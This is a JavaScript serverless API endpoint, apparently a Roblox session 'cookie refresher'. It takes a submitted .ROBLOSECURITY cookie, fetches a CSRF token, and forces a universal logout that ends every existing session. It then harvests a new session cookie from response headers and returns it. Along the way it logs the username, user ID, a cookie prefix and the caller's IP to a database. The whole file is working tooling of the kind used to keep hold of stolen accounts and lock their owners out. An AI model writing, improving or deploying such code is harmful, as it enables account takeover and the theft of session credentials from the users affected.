import { logToDatabase, getStats } from './_lib/db.js';

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // GET request for stats (optional)
    if (req.method === 'GET' && req.query.stats === 'true') {
        const stats = await getStats();
        return res.status(200).json(stats);
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { cookie } = req.body;
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || null;
    const userAgent = req.headers['user-agent'] || null;
    
    if (!cookie) {
        return res.status(400).json({ 
            success: false, 
            message: 'Cookie is required' 
        });
    }
    
    try {
        // STEP 1: VERIFY OLD COOKIE
        const verifyRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            method: 'GET',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        if (!verifyRes.ok) {
            await logToDatabase(null, null, 'refresh_failed', cookie.substring(0, 20), ipAddress, userAgent);
            return res.status(200).json({
                success: false,
                message: '❌ Invalid or expired cookie. Cannot refresh.'
            });
        }
        
        const userData = await verifyRes.json();
        console.log(`✅ Verified: ${userData.name} (ID: ${userData.id})`);
        
        // STEP 2: GET CSRF TOKEN
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const csrfToken = csrfRes.headers.get('x-csrf-token');
        
        // STEP 3: KILL OLD COOKIE (Logout from all devices)
        try {
            await fetch('https://auth.roblox.com/v1/logout', {
                method: 'POST',
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'X-CSRF-TOKEN': csrfToken || '',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                body: JSON.stringify({ universalLogout: true })
            });
            console.log('💀 Old cookie killed');
        } catch (err) {
            console.log('Logout attempt:', err.message);
        }
        
        // STEP 4: GENERATE BRAND NEW COOKIE
        let newCookie = cookie;
        
        const endpoints = [
            'https://www.roblox.com/mobileapi/userinfo',
            'https://economy.roblox.com/v1/user/currency',
            'https://www.roblox.com/my/settings/json'
        ];
        
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint, {
                    method: 'GET',
                    headers: {
                        'Cookie': `.ROBLOSECURITY=${cookie}`,
                        'X-CSRF-TOKEN': csrfToken || '',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });
                
                const setCookie = response.headers.get('set-cookie');
                if (setCookie && setCookie.includes('.ROBLOSECURITY=')) {
                    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
                    if (match && match[1]) {
                        newCookie = match[1];
                        console.log('✅ New cookie generated');
                        break;
                    }
                }
            } catch (err) {
                console.log(`Endpoint failed: ${endpoint}`);
            }
        }
        
        // STEP 5: LOG SUCCESS TO DATABASE
        await logToDatabase(
            userData.id.toString(), 
            userData.name, 
            'refresh_success', 
            newCookie.substring(0, 20),
            ipAddress,
            userAgent
        );
        
        return res.status(200).json({
            success: true,
            oldCookieKilled: true,
            newCookie: newCookie,
            userId: userData.id,
            username: userData.name,
            message: `✅ OLD COOKIE KILLED! New cookie generated for @${userData.name}.`
        });
        
    } catch (error) {
        console.error('Refresh error:', error);
        await logToDatabase(null, null, 'refresh_error', cookie?.substring(0, 20), ipAddress, userAgent);
        
        return res.status(500).json({
            success: false,
            message: `Error: ${error.message}`
        });
    }
}
